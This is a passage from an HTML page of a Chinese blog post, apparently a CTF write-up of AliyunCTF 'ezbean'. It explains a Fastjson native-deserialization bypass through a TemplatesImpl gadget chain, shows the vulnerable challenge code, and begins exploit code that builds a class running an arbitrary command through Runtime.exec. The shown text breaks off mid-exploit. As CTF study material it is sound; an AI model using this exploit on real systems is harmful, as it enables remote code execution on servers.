@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='概要 记录一下两道题的踩坑过程，取自2023AliyunCTF ezbean以及2023CIVC信息安全攻防赛Easy expr
+题目附件：
+https://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q 提取码: cuqt
+涉及知识点：
+TemplatesImpl、FastJson原生反序列化、二次反序列化、Springboot Interceptor内存马
+前置知识 TemplatesImpl利用链 即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，可以用于加载恶意字节码；
+触发条件:
+​	1._bytecodes 不为空;
+​	2.类的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+​	3.name 不为 null;
+​	4._tfactory 不为 null;
+​	5.需要执行的恶意代码写在_bytecodes 变量对应的类的静态方法或构造方法中;
+​	6._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类。
+//Gadget TemplatesImpl#getOutputProperties() -&amp;gt; TemplatesImpl#newTransformer() -&amp;gt; TemplatesImpl#getTransletInstance() -&amp;gt; TemplatesImpl#defineTransletClasses() -&amp;gt; TransletClassLoader#defineClass() BadAttributeValueExpException(jdk1.8引入) 即javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。
+因此BadAttributeValueExpException 符合了可序列化这个要求，它的readObject 方法，可以主动触发val字段的toString方法。
+JSONArray/JSONObject 在fastjson包中我们可以找到JSONArray与JSONObject继承了Serializable接口（高版本还有AntiCollisionHashMap），JSONArray在其父类Json类当中的toString方法能触发toJsonString的调用;
+且从1.2.49开始，JSONArray以及JSONObject方法有了自己的readObject方法，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查。然而当不安全的ObjectInputStream套个安全的SecureObjectInputStream将会导致绕过，若在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型即可绕过resolveClass的检查，因此我们可以通过List，Set与Map类型触发引用进行绕过。
+以HashMap为代表的能够存储key-value键值对且可序列化的类，在key-value为相同的恶意对象将会创建一个引用类型。
+1.HashMap2.ConcurrentHashMap3.LinkedHashMap4.IdentityHashMap ezbean 便于Easy expr进行对比，这里我只复现一下其非预期解，即利用fastjson原生反序列化。
+题目依赖springboot 和 fastjson1.2.60
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.'><title>JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马</title>
+
+<link rel='canonical' href='https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Btemplatesimpl%E6%B3%A8%E5%85%A5fastjson%E5%86%85%E5%AD%98%E9%A9%AC/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马'>
+<meta property='og:description' content='概要 记录一下两道题的踩坑过程，取自2023AliyunCTF ezbean以及2023CIVC信息安全攻防赛Easy expr
+题目附件：
+https://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q 提取码: cuqt
+涉及知识点：
+TemplatesImpl、FastJson原生反序列化、二次反序列化、Springboot Interceptor内存马
+前置知识 TemplatesImpl利用链 即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，可以用于加载恶意字节码；
+触发条件:
+​	1._bytecodes 不为空;
+​	2.类的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+​	3.name 不为 null;
+​	4._tfactory 不为 null;
+​	5.需要执行的恶意代码写在_bytecodes 变量对应的类的静态方法或构造方法中;
+​	6._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类。
+//Gadget TemplatesImpl#getOutputProperties() -&amp;gt; TemplatesImpl#newTransformer() -&amp;gt; TemplatesImpl#getTransletInstance() -&amp;gt; TemplatesImpl#defineTransletClasses() -&amp;gt; TransletClassLoader#defineClass() BadAttributeValueExpException(jdk1.8引入) 即javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。
+因此BadAttributeValueExpException 符合了可序列化这个要求，它的readObject 方法，可以主动触发val字段的toString方法。
+JSONArray/JSONObject 在fastjson包中我们可以找到JSONArray与JSONObject继承了Serializable接口（高版本还有AntiCollisionHashMap），JSONArray在其父类Json类当中的toString方法能触发toJsonString的调用;
+且从1.2.49开始，JSONArray以及JSONObject方法有了自己的readObject方法，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查。然而当不安全的ObjectInputStream套个安全的SecureObjectInputStream将会导致绕过，若在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型即可绕过resolveClass的检查，因此我们可以通过List，Set与Map类型触发引用进行绕过。
+以HashMap为代表的能够存储key-value键值对且可序列化的类，在key-value为相同的恶意对象将会创建一个引用类型。
+1.HashMap2.ConcurrentHashMap3.LinkedHashMap4.IdentityHashMap ezbean 便于Easy expr进行对比，这里我只复现一下其非预期解，即利用fastjson原生反序列化。
+题目依赖springboot 和 fastjson1.2.60
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.'>
+<meta property='og:url' content='https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Btemplatesimpl%E6%B3%A8%E5%85%A5fastjson%E5%86%85%E5%AD%98%E9%A9%AC/'>
+<meta property='og:site_name' content='Kleinor'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2023-07-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-07-09T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马">
+<meta name="twitter:description" content="概要 记录一下两道题的踩坑过程，取自2023AliyunCTF ezbean以及2023CIVC信息安全攻防赛Easy expr
+题目附件：
+https://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q 提取码: cuqt
+涉及知识点：
+TemplatesImpl、FastJson原生反序列化、二次反序列化、Springboot Interceptor内存马
+前置知识 TemplatesImpl利用链 即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，可以用于加载恶意字节码；
+触发条件:
+​	1._bytecodes 不为空;
+​	2.类的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+​	3.name 不为 null;
+​	4._tfactory 不为 null;
+​	5.需要执行的恶意代码写在_bytecodes 变量对应的类的静态方法或构造方法中;
+​	6._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类。
+//Gadget TemplatesImpl#getOutputProperties() -&amp;gt; TemplatesImpl#newTransformer() -&amp;gt; TemplatesImpl#getTransletInstance() -&amp;gt; TemplatesImpl#defineTransletClasses() -&amp;gt; TransletClassLoader#defineClass() BadAttributeValueExpException(jdk1.8引入) 即javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。
+因此BadAttributeValueExpException 符合了可序列化这个要求，它的readObject 方法，可以主动触发val字段的toString方法。
+JSONArray/JSONObject 在fastjson包中我们可以找到JSONArray与JSONObject继承了Serializable接口（高版本还有AntiCollisionHashMap），JSONArray在其父类Json类当中的toString方法能触发toJsonString的调用;
+且从1.2.49开始，JSONArray以及JSONObject方法有了自己的readObject方法，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查。然而当不安全的ObjectInputStream套个安全的SecureObjectInputStream将会导致绕过，若在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型即可绕过resolveClass的检查，因此我们可以通过List，Set与Map类型触发引用进行绕过。
+以HashMap为代表的能够存储key-value键值对且可序列化的类，在key-value为相同的恶意对象将会创建一个引用类型。
+1.HashMap2.ConcurrentHashMap3.LinkedHashMap4.IdentityHashMap ezbean 便于Easy expr进行对比，这里我只复现一下其非预期解，即利用fastjson原生反序列化。
+题目依赖springboot 和 fastjson1.2.60
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" style="background-color: #2a9d8f; color: #fff;">
+                Java
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Btemplatesimpl%E6%B3%A8%E5%85%A5fastjson%E5%86%85%E5%AD%98%E9%A9%AC/">JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马</a>
+    </h2>
+
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 09, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="概要">概要</h2>
+<p>  记录一下两道题的踩坑过程，取自2023AliyunCTF ezbean以及2023CIVC信息安全攻防赛Easy expr</p>
+<p>题目附件：</p>
+<p><a class="link" href="https://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q</a> 提取码: cuqt</p>
+<p>涉及知识点：</p>
+<p><strong>TemplatesImpl</strong>、<strong>FastJson原生反序列化</strong>、<strong>二次反序列化</strong>、<strong>Springboot Interceptor内存马</strong></p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="templatesimpl利用链">TemplatesImpl利用链</h3>
+<p>即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，<strong>可以用于加载恶意字节码</strong>；</p>
+<p>触发条件:</p>
+<p>​		1._bytecodes 不为空;</p>
+<p>​		2.类的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</p>
+<p>​		3.name 不为 null;</p>
+<p>​		4._tfactory 不为 null;</p>
+<p>​		5.需要执行的恶意代码写在_bytecodes 变量对应的类的静态方法或构造方法中;</p>
+<p>​		6._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//Gadget
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">newTransformer</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getTransletInstance</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">defineTransletClasses</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TransletClassLoader</span><span class="err">#</span><span class="n">defineClass</span><span class="o">()</span>
+</span></span></code></pre></div><h3 id="badattributevalueexpexceptionjdk18引入">BadAttributeValueExpException(jdk1.8引入)</h3>
+<p>  即javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。</p>
+<p>  因此BadAttributeValueExpException 符合了可序列化这个要求，它的readObject 方法，<strong>可以主动触发val字段的toString方法</strong>。</p>
+<h3 id="jsonarrayjsonobject">JSONArray/JSONObject</h3>
+<p>  在fastjson包中我们可以找到JSONArray与JSONObject继承了Serializable接口（高版本还有AntiCollisionHashMap），JSONArray在其父类Json类当中的toString方法能触发toJsonString的调用;</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-2.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205013-2.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>  且从1.2.49开始，JSONArray以及JSONObject方法有了自己的readObject方法，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查。然而<strong>当不安全的ObjectInputStream套个安全的SecureObjectInputStream将会导致绕过</strong>，若在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型即可绕过resolveClass的检查，因此我们可以<strong>通过List，Set与Map类型触发引用进行绕过</strong>。</p>
+<p>  以HashMap为代表的能够存储key-value键值对且可序列化的类，在key-value为相同的恶意对象将会创建一个引用类型。</p>
+<pre tabindex="0"><code>1.HashMap
+2.ConcurrentHashMap
+3.LinkedHashMap
+4.IdentityHashMap
+</code></pre><h2 id="ezbean">ezbean</h2>
+<p>  便于Easy expr进行对比，这里我只复现一下其非预期解，即利用fastjson原生反序列化。</p>
+<p>题目依赖springboot 和 fastjson1.2.60</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">fastjson</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="mf">1.2.60</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>入口点（source）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@RestController</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">IndexController</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">&#34;/read&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">String</span> <span class="nf">read</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ByteArrayInputStream</span> <span class="n">byteArrayInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">MyObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyObjectInputStream</span><span class="o">(</span><span class="n">byteArrayInputStream</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s">&#34;error&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s">&#34;success&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>其中利用了一个不安全的MyObjectInputStream进行反序列化，其继承自ObjectInputStream，因此本题可以通过引用的数据类型从而不执行<code>resolveClass</code>以绕过其对危险类的检查；</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyObjectInputStream</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">blacklist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34;java\\.security.*&#34;</span><span class="o">,</span> <span class="s">&#34;java\\.rmi.*&#34;</span><span class="o">,</span>  <span class="s">&#34;com\\.fasterxml.*&#34;</span><span class="o">,</span> <span class="s">&#34;com\\.ctf\\.*&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">           <span class="s">&#34;org\\.springframework.*&#34;</span><span class="o">,</span> <span class="s">&#34;org\\.yaml.*&#34;</span><span class="o">,</span> <span class="s">&#34;javax\\.management\\.remote.*&#34;</span>
+</span></span><span class="line"><span class="cl">   <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">public</span> <span class="nf">MyObjectInputStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inputStream</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">super</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">protected</span> <span class="n">Class</span> <span class="nf">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">cls</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">(!</span><span class="n">contains</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidClassException</span><span class="o">(</span><span class="s">&#34;Unexpected serialized class&#34;</span><span class="o">,</span> <span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">contains</span><span class="o">(</span><span class="n">String</span> <span class="n">targetValue</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">forbiddenPackage</span> <span class="o">:</span> <span class="n">blacklist</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="o">(</span><span class="n">targetValue</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">forbiddenPackage</span><span class="o">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>结合前置知识提到几个关键点，我们可以得到完整的利用链，其中在恢复过程中由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//Gadget
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">JSON</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">JSON</span><span class="err">#</span><span class="n">toJSONString</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">newTransformer</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getTransletInstance</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">defineTransletClasses</span><span class="o">()</span> <span class="o">-&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">TransletClassLoader</span><span class="err">#</span><span class="n">defineClass</span><span class="o">()</span>
+</span></span></code></pre></div><p>exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSONArray</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URLEncoder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.CtConstructor</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">FJ</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">genPayload</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">&#34;a&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CtClass</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superClass</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">CtConstructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CtConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">CtClass</span><span class="o">[]{},</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">constructor</span><span class="o">.</span><span class="na">setBody</span><span class="o">(</span><span class="s">&#34;Runtime.getRuntime().exec(\&#34;&#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s">&#34;\&#34;);&#34;</span><span class="o">);</span>
